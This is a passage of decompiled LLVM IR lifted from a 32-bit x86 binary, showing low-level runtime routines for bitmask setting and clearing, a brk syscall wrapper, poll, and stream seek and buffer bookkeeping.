dec_label_pc_8051294:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051294 = load i32, i32* @ebx, align 4
  store i32 %v0_8051294, i32* %stack_var_-4, align 4
  %v1_80512a2 = add i32 %arg2, -1
  %v1_80512a5 = urem i32 %v1_80512a2, 32
  %v2_80512a5 = icmp eq i32 %v1_80512a5, 0
  store i32 %v1_80512a5, i32* @ecx, align 4
  %v2_80512a8 = udiv i32 %v1_80512a2, 32
  store i32 %v2_80512a8, i32* @edx, align 4
  br i1 %v2_80512a5, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051294
  %v5_80512ab = shl i32 1, %v1_80512a5
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051294, %bb
  %v6_80512ad = phi i32 [ 1, %dec_label_pc_8051294 ], [ %v5_80512ab, %bb ]
  %v2_80512ad = mul nuw nsw i32 %v2_80512a8, 4
  %v3_80512ad = add i32 %v2_80512ad, %arg1
  %v4_80512ad = inttoptr i32 %v3_80512ad to i32*
  %v5_80512ad = load i32, i32* %v4_80512ad, align 4
  %v7_80512ad = or i32 %v5_80512ad, %v6_80512ad
  store i32 %v7_80512ad, i32* %v4_80512ad, align 4
  %v2_80512b2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80512b2, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80512a8, { 1, 0 }
  uselistorder i32 %v1_80512a5, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80512b4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80512b4:
  %v1_80512c2 = add i32 %arg2, -1
  %v1_80512c5 = urem i32 %v1_80512c2, 32
  %v2_80512c5 = icmp eq i32 %v1_80512c5, 0
  %v2_80512c8 = udiv i32 %v1_80512c2, 32
  br i1 %v2_80512c5, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80512b4
  %v4_80512cb = shl i32 -2, %v1_80512c5
  %v5_80512cb = sub nsw i32 32, %v1_80512c5
  %v6_80512cb = lshr i32 -2, %v5_80512cb
  %v7_80512cb = or i32 %v6_80512cb, %v4_80512cb
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80512b4, %bb
  %v6_80512cd = phi i32 [ -2, %dec_label_pc_80512b4 ], [ %v7_80512cb, %bb ]
  %v2_80512cd = mul nuw nsw i32 %v2_80512c8, 4
  %v3_80512cd = add i32 %v2_80512cd, %arg1
  %v4_80512cd = inttoptr i32 %v3_80512cd to i32*
  %v5_80512cd = load i32, i32* %v4_80512cd, align 4
  %v7_80512cd = and i32 %v5_80512cd, %v6_80512cd
  store i32 %v7_80512cd, i32* %v4_80512cd, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80512c5, { 1, 2, 0 }
  uselistorder i32 -2, { 4, 6, 5, 3, 7, 0, 17, 18, 2, 14, 15, 16, 20, 1, 8, 9, 10, 19, 11, 12, 13 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80512d4() local_unnamed_addr {
dec_label_pc_80512d4:
  %v0_80512d4 = load i32, i32* @eax, align 4
  %v1_80512d4 = add i32 %v0_80512d4, 28
  %v2_80512d4 = inttoptr i32 %v1_80512d4 to i32*
  %v3_80512d4 = load i32, i32* %v2_80512d4, align 4
  store i32 %v3_80512d4, i32* @global_var_8058d7c.206, align 4
  %v1_80512dd = add i32 %v0_80512d4, 44
  %v2_80512dd = inttoptr i32 %v1_80512dd to i32*
  %v3_80512dd = load i32, i32* %v2_80512dd, align 4
  store i32 %v3_80512dd, i32* @global_var_8058d80.207, align 128
  ret i32 %v3_80512dd
}

define i32 @function_80512e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80512e8:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80512e8 = load i32, i32* @ebx, align 4
  store i32 %v0_80512e8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80512fb = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80512fb, i32* @global_var_8058784.184, align 4
  %v7_8051306 = icmp ult i32 %v1_80512fb, %arg1
  %v1_8051308 = icmp eq i1 %v7_8051306, false
  br i1 %v1_8051308, label %dec_label_pc_8051318, label %dec_label_pc_805130a

dec_label_pc_805130a:                             ; preds = %dec_label_pc_80512e8
  %v0_805130a = load i32, i32* %stack_var_-4, align 4
  %v1_805130a = call i32 @function_804b774(i32 %v0_805130a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8051312 = inttoptr i32 %v1_805130a to i32*
  store i32 12, i32* %v1_8051312, align 4
  %v0_8051318.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051318

dec_label_pc_8051318:                             ; preds = %dec_label_pc_80512e8, %dec_label_pc_805130a
  %v0_8051318 = phi i32 [ 0, %dec_label_pc_80512e8 ], [ %v0_8051318.pre, %dec_label_pc_805130a ]
  %v2_805131c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805131c, i32* @ebx, align 4
  ret i32 %v0_8051318

; uselistorder directives
  uselistorder i32 %v1_80512fb, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8058784.184, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051318, { 1, 0 }
}

define i32 @function_8051320() local_unnamed_addr {
dec_label_pc_8051320:
  %v0_8051323 = load i32, i32* @eax, align 4
  %v1_8051325 = sub i32 0, %v0_8051323
  %v1_8051327 = call i32 @function_804b774(i32 ptrtoint (i32* @0 to i32))
  %v2_805132c = inttoptr i32 %v1_8051327 to i32*
  store i32 %v1_8051325, i32* %v2_805132c, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 3, 4, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
}

define i32 @function_8051338() local_unnamed_addr {
dec_label_pc_8051338:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051338 = load i32, i32* @edi, align 4
  store i32 %v0_8051338, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8051348 = load i32, i32* @ebx, align 4
  %v1_8051349 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8051350 = call i32 @poll(%pollfd* %v1_8051349, i32 %tmp3, i32 %tmp)
  store i32 %v0_8051348, i32* @ebx, align 4
  store i32 %v5_8051350, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8051350, -4095
  br i1 %tmp10, label %dec_label_pc_8051368, label %dec_label_pc_805135c

dec_label_pc_805135c:                             ; preds = %dec_label_pc_8051338
  %v1_805135c = call i32 @function_804b774(i32 %v0_8051348)
  %v0_8051361 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051361 = sub i32 0, %v0_8051361
  %v2_8051363 = inttoptr i32 %v1_805135c to i32*
  store i32 %v1_8051361, i32* %v2_8051363, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051368

dec_label_pc_8051368:                             ; preds = %dec_label_pc_8051338, %dec_label_pc_805135c
  %v0_8051368 = phi i32 [ %v5_8051350, %dec_label_pc_8051338 ], [ -1, %dec_label_pc_805135c ]
  %v2_805136c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805136c, i32* @edi, align 4
  ret i32 %v0_8051368

; uselistorder directives
  uselistorder i32 %v5_8051350, { 1, 0, 2 }
  uselistorder i32 %v0_8051348, { 1, 0 }
  uselistorder label %dec_label_pc_8051368, { 1, 0 }
}

define i32 @function_8051370(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051370:
  %v1_805137b = ashr i32 %arg2, 31
  %v4_8051382 = inttoptr i32 %arg1 to i16*
  %v5_8051382 = call i32 @function_805138c(i16* %v4_8051382, i32 %arg2, i32 %v1_805137b, i32 %arg3)
  ret i32 %v5_8051382
}

define i32 @function_805138c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805138c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805138c = load i32, i32* @ebp, align 4
  %v0_805138d = load i32, i32* @edi, align 4
  %v0_805138e = load i32, i32* @esi, align 4
  %v0_805138f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_805139f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805139f, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80513c3, label %dec_label_pc_80513b0

dec_label_pc_80513b0:                             ; preds = %dec_label_pc_805138c
  %v1_80513b0 = call i32 @function_804b774(i32 %arg2)
  store i32 %v1_80513b0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_80513b8 = inttoptr i32 %v1_80513b0 to i32*
  store i32 22, i32* %v1_80513b8, align 4
  br label %dec_label_pc_8051465

dec_label_pc_80513c3:                             ; preds = %dec_label_pc_805138c
  %v1_80513c3 = add i32 %v4_805139f, 52
  %v2_80513c3 = inttoptr i32 %v1_80513c3 to i32*
  %v3_80513c3 = load i32, i32* %v2_80513c3, align 4
  %v1_80513c6 = icmp eq i32 %v3_80513c3, 0
  %v1_80513c8 = icmp eq i1 %v1_80513c6, false
  br i1 %v1_80513c8, label %dec_label_pc_80513e9, label %dec_label_pc_80513ca

dec_label_pc_80513ca:                             ; preds = %dec_label_pc_80513c3
  %v1_80513ca = add i32 %v4_805139f, 56
  store i32 %v1_80513ca, i32* @ebx, align 4
  %v2_80513d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80513d4, i32* @eax, align 4
  %v3_80513d9 = call i32 @function_804f2ae(i32 %v2_80513d4, i32 134541995)
  store i32 %v3_80513d9, i32* %eax.global-to-local, align 4
  %v0_80513de = load i32, i32* @ebx, align 4
  %v2_80513e1 = call i32 @function_804f2ab(i32 %v0_80513de)
  store i32 %v2_80513e1, i32* %eax.global-to-local, align 4
  %v0_80513e9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80513e9

dec_label_pc_80513e9:                             ; preds = %dec_label_pc_80513c3, %dec_label_pc_80513ca
  %v0_80513f1 = phi i32 [ %v4_805139f, %dec_label_pc_80513c3 ], [ %v0_80513e9.pre, %dec_label_pc_80513ca ]
  %v1_80513e9 = inttoptr i32 %v0_80513f1 to i8*
  %v2_80513e9 = load i8, i8* %v1_80513e9, align 1
  %v3_80513e9 = and i8 %v2_80513e9, 64
  %v4_80513e9 = icmp eq i8 %v3_80513e9, 0
  br i1 %v4_80513e9, label %dec_label_pc_80513fe, label %dec_label_pc_80513ee

dec_label_pc_80513ee:                             ; preds = %dec_label_pc_80513e9
  %v2_80513f2 = call i32 @function_804bf78(i32 %v0_80513f1)
  store i32 %v2_80513f2, i32* %eax.global-to-local, align 4
  %v1_80513fa = icmp eq i32 %v2_80513f2, 0
  %v1_80513fc = icmp eq i1 %v1_80513fa, false
  br i1 %v1_80513fc, label %dec_label_pc_805144d, label %dec_label_pc_80513fe

dec_label_pc_80513fe:                             ; preds = %dec_label_pc_80513ee, %dec_label_pc_80513e9
  %v0_80513fe = load i32, i32* @edi, align 4
  %v9_80513fe = icmp eq i32 %v0_80513fe, 1
  %v1_8051401 = icmp eq i1 %v9_80513fe, false
  br i1 %v1_8051401, label %dec_label_pc_80513fe.dec_label_pc_8051417_crit_edge, label %dec_label_pc_8051403

dec_label_pc_80513fe.dec_label_pc_8051417_crit_edge: ; preds = %dec_label_pc_80513fe
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8051417

dec_label_pc_8051403:                             ; preds = %dec_label_pc_80513fe
  %v0_8051403 = load i32, i32* @ecx, align 4
  %v2_8051405 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051405, i32* %eax.global-to-local, align 4
  %v0_805140a = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_805140a to i32*
  %v6_805140b = call i32 @function_80514b4(i32* %tmp26, i32 %v2_8051405, i32 %v0_8051403, i32 %v0_8051403)
  store i32 %v6_805140b, i32* %eax.global-to-local, align 4
  %v2_8051413 = icmp slt i32 %v6_805140b, 0
  br i1 %v2_8051413, label %dec_label_pc_805144d, label %dec_label_pc_8051403.dec_label_pc_8051417_crit_edge

dec_label_pc_8051403.dec_label_pc_8051417_crit_edge: ; preds = %dec_label_pc_8051403
  %v0_8051418.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051417

dec_label_pc_8051417:                             ; preds = %dec_label_pc_80513fe.dec_label_pc_8051417_crit_edge, %dec_label_pc_8051403.dec_label_pc_8051417_crit_edge
  %v2_8051419.pre-phi = phi i32 [ %.pre6, %dec_label_pc_80513fe.dec_label_pc_8051417_crit_edge ], [ %v2_8051405, %dec_label_pc_8051403.dec_label_pc_8051417_crit_edge ]
  %v0_8051418 = phi i32 [ %v0_80513fe, %dec_label_pc_80513fe.dec_label_pc_8051417_crit_edge ], [ %v0_8051418.pre, %dec_label_pc_8051403.dec_label_pc_8051417_crit_edge ]
  %v0_8051417 = load i32, i32* @edx, align 4
  store i32 %v2_8051419.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805141e = load i32, i32* @esi, align 4
  %v5_805141f = inttoptr i32 %v2_8051419.pre-phi to i32*
  %v6_805141f = call i32 @function_80515ec(i32 %v0_805141e, i32* %v5_805141f, i32 %v0_8051418, i32 %v0_8051417)
  store i32 %v6_805141f, i32* %eax.global-to-local, align 4
  %v2_8051427 = icmp slt i32 %v6_805141f, 0
  br i1 %v2_8051427, label %dec_label_pc_805144d, label %dec_label_pc_805142b

dec_label_pc_805142b:                             ; preds = %dec_label_pc_8051417
  %v0_805142b = load i32, i32* @esi, align 4
  %v1_805142b = inttoptr i32 %v0_805142b to i16*
  %v2_805142b = load i16, i16* %v1_805142b, align 2
  %v3_805142b = and i16 %v2_805142b, -72
  store i16 %v3_805142b, i16* %v1_805142b, align 2
  %v0_805142f = load i32, i32* @esi, align 4
  %v1_805142f = add i32 %v0_805142f, 8
  %v2_805142f = inttoptr i32 %v1_805142f to i32*
  %v3_805142f = load i32, i32* %v2_805142f, align 4
  store i32 %v3_805142f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8051434 = add i32 %v0_805142f, 16
  %v3_8051434 = inttoptr i32 %v2_8051434 to i32*
  store i32 %v3_805142f, i32* %v3_8051434, align 4
  %v0_8051437 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051437 = load i32, i32* @esi, align 4
  %v2_8051437 = add i32 %v1_8051437, 20
  %v3_8051437 = inttoptr i32 %v2_8051437 to i32*
  store i32 %v0_8051437, i32* %v3_8051437, align 4
  %v0_805143a = load i32, i32* %eax.global-to-local, align 4
  %v1_805143a = load i32, i32* @esi, align 4
  %v2_805143a = add i32 %v1_805143a, 24
  %v3_805143a = inttoptr i32 %v2_805143a to i32*
  store i32 %v0_805143a, i32* %v3_805143a, align 4
  %v0_805143d = load i32, i32* %eax.global-to-local, align 4
  %v1_805143d = load i32, i32* @esi, align 4
  %v2_805143d = add i32 %v1_805143d, 28
  %v3_805143d = inttoptr i32 %v2_805143d to i32*
  store i32 %v0_805143d, i32* %v3_805143d, align 4
  %v0_8051440 = load i32, i32* @esi, align 4
  %v1_8051440 = add i32 %v0_8051440, 44
  %v2_8051440 = inttoptr i32 %v1_8051440 to i32*
  store i32 0, i32* %v2_8051440, align 4
  %v0_8051447 = load i32, i32* @esi, align 4
  %v1_8051447 = add i32 %v0_8051447, 2
  %v2_8051447 = inttoptr i32 %v1_8051447 to i8*
  store i8 0, i8* %v2_8051447, align 1
  br label %dec_label_pc_8051450

dec_label_pc_805144d:                             ; preds = %dec_label_pc_8051417, %dec_label_pc_8051403, %dec_label_pc_80513ee
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051450

dec_label_pc_8051450:                             ; preds = %dec_label_pc_805142b, %dec_label_pc_805144d
  br i1 %v1_80513c8, label %dec_label_pc_8051465, label %dec_label_pc_8051454

dec_label_pc_8051454:                             ; preds = %dec_label_pc_8051450
  %v2_8051458 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051458, i32* @eax, align 4
  %v3_805145d = call i32 @function_804f2ae(i32 %v2_8051458, i32 1)
  store i32 %v3_805145d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051465

dec_label_pc_8051465:                             ; preds = %dec_label_pc_8051450, %dec_label_pc_80513b0, %dec_label_pc_8051454
  %v0_8051468 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051468, i32* %eax.global-to-local, align 4
  store i32 %v0_805138f, i32* @ebx, align 4
  store i32 %v0_805138e, i32* @esi, align 4
  store i32 %v0_805138d, i32* @edi, align 4
  store i32 %v0_805138c, i32* @ebp, align 4
  ret i32 %v0_8051468

; uselistorder directives
  uselistorder i32 %v2_8051419.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80513fe, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @function_804f2ab, { 7, 28, 27, 26, 25, 6, 5, 24, 3, 29, 35, 34, 10, 2, 1, 0, 9, 8, 23, 21, 20, 19, 18, 17, 22, 16, 33, 4, 15, 14, 32, 31, 30, 13, 12, 11 }
  uselistorder i32 (i32, i32)* @function_804f2ae, { 7, 6, 49, 48, 47, 46, 45, 44, 43, 42, 5, 4, 3, 2, 41, 40, 1, 0, 51, 50, 63, 62, 61, 60, 13, 12, 11, 10, 9, 8, 39, 38, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 37, 36, 25, 24, 59, 58, 23, 22, 21, 20, 57, 56, 55, 54, 53, 52, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 134541995, { 2, 3, 29, 30, 31, 32, 33, 34, 0, 19, 4, 5, 6, 7, 8, 9, 10, 1, 20, 21, 22, 11, 12, 13, 14, 15, 16, 23, 24, 25, 26, 17, 27, 28, 18 }
  uselistorder i32 52, { 16, 1, 8, 0, 4, 5, 6, 14, 15, 9, 11, 7, 17, 18, 12, 13, 3, 2, 10 }
  uselistorder i32 22, { 9, 12, 8, 0, 1, 2, 3, 6, 10, 11, 7, 4, 5 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051465, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051450, { 1, 0 }
  uselistorder label %dec_label_pc_8051417, { 1, 0 }
  uselistorder label %dec_label_pc_80513e9, { 1, 0 }
}

define i32 @function_8051470(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051470:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051470 = load i32, i32* @ebx, align 4
  store i32 %v0_8051470, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8051476 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051476, i32* @ebx, align 4
  %v1_805147e = bitcast i16* %arg1 to i8*
  %v2_805147e = load i8, i8* %v1_805147e, align 1
  %v3_805147e = and i8 %v2_805147e, 4
  %v4_805147e = icmp eq i8 %v3_805147e, 0
  %v1_8051481 = icmp eq i1 %v4_805147e, false
  br i1 %v1_8051481, label %dec_label_pc_80514b0, label %dec_label_pc_8051483

dec_label_pc_8051483:                             ; preds = %dec_label_pc_8051470
  %v2_8051483 = icmp slt i32 %arg3, 0
  %v1_8051485 = icmp eq i1 %v2_8051483, false
  br i1 %v1_8051485, label %dec_label_pc_805148c, label %dec_label_pc_8051487

dec_label_pc_8051487:                             ; preds = %dec_label_pc_8051483
  br label %dec_label_pc_805148c

dec_label_pc_805148c:                             ; preds = %dec_label_pc_8051483, %dec_label_pc_8051487
  %v0_805148d = phi i32 [ %arg3, %dec_label_pc_8051483 ], [ 2147483647, %dec_label_pc_8051487 ]
  %v1_8051492 = add i32 %v4_8051476, 4
  %v2_8051492 = inttoptr i32 %v1_8051492 to i32*
  %v3_8051492 = load i32, i32* %v2_8051492, align 4
  %v4_8051495 = inttoptr i32 %arg2 to i32*
  %v5_8051495 = call i32 @function_8052268(i32 %v3_8051492, i32* %v4_8051495, i32 %v0_805148d, i32 0)
  store i32 %v5_8051495, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v5_8051495, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80514b0, label %dec_label_pc_80514a2

dec_label_pc_80514a2:                             ; preds = %dec_label_pc_805148c
  %v1_805149d = icmp eq i32 %v5_8051495, 0
  %v4_80514a0 = icmp eq i1 %v1_805149d, false
  %v0_80514aa = load i32, i32* @ebx, align 4
  %v1_80514aa = inttoptr i32 %v0_80514aa to i16*
  %v2_80514aa = load i16, i16* %v1_80514aa, align 2
  br i1 %v4_80514a0, label %dec_label_pc_80514aa, label %dec_label_pc_80514a4

dec_label_pc_80514a4:                             ; preds = %dec_label_pc_80514a2
  %v3_80514a4 = or i16 %v2_80514aa, 4
  store i16 %v3_80514a4, i16* %v1_80514aa, align 2
  %v0_80514b3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514b0

dec_label_pc_80514aa:                             ; preds = %dec_label_pc_80514a2
  %v3_80514aa = or i16 %v2_80514aa, 8
  store i16 %v3_80514aa, i16* %v1_80514aa, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514b0

dec_label_pc_80514b0:                             ; preds = %dec_label_pc_805148c, %dec_label_pc_8051470, %dec_label_pc_80514a4, %dec_label_pc_80514aa
  %v0_80514b3 = phi i32 [ %v5_8051495, %dec_label_pc_805148c ], [ 0, %dec_label_pc_8051470 ], [ %v0_80514b3.pre, %dec_label_pc_80514a4 ], [ 0, %dec_label_pc_80514aa ]
  %v2_80514b2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80514b2, i32* @ebx, align 4
  ret i32 %v0_80514b3

; uselistorder directives
  uselistorder i16 %v2_80514aa, { 1, 0 }
  uselistorder i32 %v5_8051495, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80514b0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805148c, { 1, 0 }
}

define i32 @function_80514b4(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80514b4:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80514c4 = load i32, i32* %arg1, align 4
  store i32 %v2_80514c4, i32* %esi.global-to-local, align 4
  %v1_80514cb = urem i32 %v2_80514c4, 4
  %v2_80514cb = icmp eq i32 %v1_80514cb, 0
  store i32 %v1_80514cb, i32* %ecx.global-to-local, align 4
  br i1 %v2_80514cb, label %dec_label_pc_80514fa, label %dec_label_pc_80514d0

dec_label_pc_80514d0:                             ; preds = %dec_label_pc_80514b4
  %v1_80514d2 = add nsw i32 %v1_80514cb, -1
  %v8_80514d2 = icmp eq i32 %v1_80514d2, 0
  store i32 %v1_80514d2, i32* @edx, align 4
  br i1 %v8_80514d2, label %dec_label_pc_80514fa, label %dec_label_pc_80514d5

dec_label_pc_80514d5:                             ; preds = %dec_label_pc_80514d0
  %v3_80514d5 = and i32 %v2_80514c4, 2048
  %v4_80514d5 = icmp eq i32 %v3_80514d5, 0
  br i1 %v4_80514d5, label %dec_label_pc_80514fa, label %dec_label_pc_80514da

dec_label_pc_80514da:                             ; preds = %dec_label_pc_80514d5
  %v6_80514da = sub nsw i32 1, %v1_80514cb
  %v7_80514da = and i32 %v1_80514d2, %v6_80514da
  %v8_80514da = icmp slt i32 %v7_80514da, 0
  %v9_80514da = icmp eq i32 %v1_80514cb, 2
  %v10_80514da = icmp ult i32 %v1_80514cb, 2
  %v3_80514dd = icmp eq i1 %v10_80514da, %v8_80514da
  %v4_80514dd = icmp eq i1 %v9_80514da, false
  %v5_80514dd = and i1 %v4_80514dd, %v3_80514dd
  br i1 %v5_80514dd, label %dec_label_pc_8051550, label %dec_label_pc_80514df

dec_label_pc_80514df:                             ; preds = %dec_label_pc_80514da
  %v1_80514df = add i32 %tmp6, 40
  %v2_80514df = inttoptr i32 %v1_80514df to i32*
  %v3_80514df = load i32, i32* %v2_80514df, align 4
  %v4_80514df = icmp eq i32 %v3_80514df, 0
  %v1_80514e3 = icmp eq i1 %v4_80514df, false
  br i1 %v1_80514e3, label %dec_label_pc_8051550, label %dec_label_pc_80514e5

dec_label_pc_80514e5:                             ; preds = %dec_label_pc_80514df
  %v1_80514e5 = add i32 %tmp6, 3
  %v2_80514e5 = inttoptr i32 %v1_80514e5 to i8*
  %v3_80514e5 = load i8, i8* %v2_80514e5, align 1
  %v4_80514e5 = zext i8 %v3_80514e5 to i32
  %v2_80514e9 = sub nsw i32 %v1_80514d2, %v4_80514e5
  %v1_80514eb = add i32 %tmp6, 44
  %v2_80514eb = inttoptr i32 %v1_80514eb to i32*
  %v3_80514eb = load i32, i32* %v2_80514eb, align 4
  %v1_80514ef = add nsw i32 %v2_80514e9, -1
  %tmp12 = icmp slt i32 %v3_80514eb, 1
  br i1 %tmp12, label %dec_label_pc_80514fa, label %dec_label_pc_80514f4

dec_label_pc_80514f4:                             ; preds = %dec_label_pc_80514e5
  %v1_80514f4 = add i32 %tmp6, 2
  %v2_80514f4 = inttoptr i32 %v1_80514f4 to i8*
  %v3_80514f4 = load i8, i8* %v2_80514f4, align 1
  %v4_80514f4 = zext i8 %v3_80514f4 to i32
  %v2_80514f8 = sub nsw i32 %v1_80514ef, %v4_80514f4
  br label %dec_label_pc_80514fa

dec_label_pc_80514fa:                             ; preds = %dec_label_pc_80514e5, %dec_label_pc_80514d5, %dec_label_pc_80514d0, %dec_label_pc_80514b4, %dec_label_pc_80514f4
  %v0_8051511 = phi i32 [ %v1_80514ef, %dec_label_pc_80514e5 ], [ %v1_80514d2, %dec_label_pc_80514d5 ], [ 0, %dec_label_pc_80514d0 ], [ 0, %dec_label_pc_80514b4 ], [ %v2_80514f8, %dec_label_pc_80514f4 ]
  %v2_80514fa = and i32 %v2_80514c4, 64
  %v3_80514fa = icmp eq i32 %v2_80514fa, 0
  %storemerge.in.in.v = select i1 %v3_80514fa, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8051509 = add i32 %tmp6, 16
  %v3_8051509 = inttoptr i32 %v2_8051509 to i32*
  %v4_8051509 = load i32, i32* %v3_8051509, align 4
  %v5_8051509 = sub i32 %storemerge, %v4_8051509
  %v1_805150c = inttoptr i32 %arg2 to i32*
  %v2_805150c = load i32, i32* %v1_805150c, align 4
  store i32 %v2_805150c, i32* %ecx.global-to-local, align 4
  %v1_805150e = add i32 %arg2, 4
  %v2_805150e = inttoptr i32 %v1_805150e to i32*
  %v3_805150e = load i32, i32* %v2_805150e, align 4
  store i32 %v3_805150e, i32* %ebx.global-to-local, align 4
  %v2_8051511 = add i32 %v5_8051509, %v0_8051511
  store i32 %v2_8051511, i32* %esi.global-to-local, align 4
  %v2_805151c = ashr i32 %v2_8051511, 31
  %v5_8051525 = sub i32 %v2_805150c, %v2_8051511
  %v10_8051525 = icmp ult i32 %v2_805150c, %v2_8051511
  %v6_8051529 = zext i1 %v10_8051525 to i32
  %tmp = icmp slt i32 %v2_8051511, 0
  %v2_805151c.neg = zext i1 %tmp to i32
  %v7_8051529 = add i32 %v3_805150e, %v2_805151c.neg
  %v8_8051529 = add i32 %v7_8051529, %v6_8051529
  store i32 %v8_8051529, i32* @edx, align 4
  store i32 %v5_8051525, i32* %v1_805150c, align 4
  %v0_805152f = load i32, i32* @edx, align 4
  %v1_805152f = load i32, i32* %edi.global-to-local, align 4
  %v2_805152f = add i32 %v1_805152f, 4
  %v3_805152f = inttoptr i32 %v2_805152f to i32*
  store i32 %v0_805152f, i32* %v3_805152f, align 4
  %v0_8051532 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051532 = add i32 %v0_8051532, 4
  %v2_8051532 = inttoptr i32 %v1_8051532 to i32*
  %v3_8051532 = load i32, i32* %v2_8051532, align 4
  %v4_8051532 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8051535 = icmp slt i32 %v3_8051532, %v4_8051532
  br i1 %v5_8051535, label %dec_label_pc_805153f, label %dec_label_pc_8051537

